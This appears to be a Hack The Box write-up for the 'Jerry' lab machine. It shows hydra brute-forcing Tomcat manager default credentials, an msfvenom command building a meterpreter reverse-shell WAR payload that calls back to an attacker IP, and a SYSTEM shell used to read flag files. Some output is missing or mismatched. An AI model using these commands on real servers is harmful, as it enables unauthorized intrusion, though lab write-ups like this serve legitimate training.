# HTB writeup - Jerry

Let's start with the usual scan:
```

I tried accessing the manager page, however the default admin:admin didn't work. I therefore ran hydra with the dictionary specifically for default password:
```
root@kali:~# hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

With the creds hydra found, I was able to login to the restricted area /manager/:

As we can see, we can upload our own malicious war file to get a shell.
Let's generate it with meterpreter:
```
root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=9001  --format war -o reverse.war
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 510 bytes
Final size of war file: 2469 bytes
Saved as: reverse.war

msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.22:9001 
```
<br />
After having deployed the file, we got a meterpreter session back. 
<br />
We didn't even have to do any privesc since we were already administrator:
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
I went to Users\Administrator\Desktop\flags to collect user and root.txt:
```
C:\Users\Administrator\Desktop\flags>more "2 for the price of 1.txt"
more "2 for the price of 1.txt"
user.txt
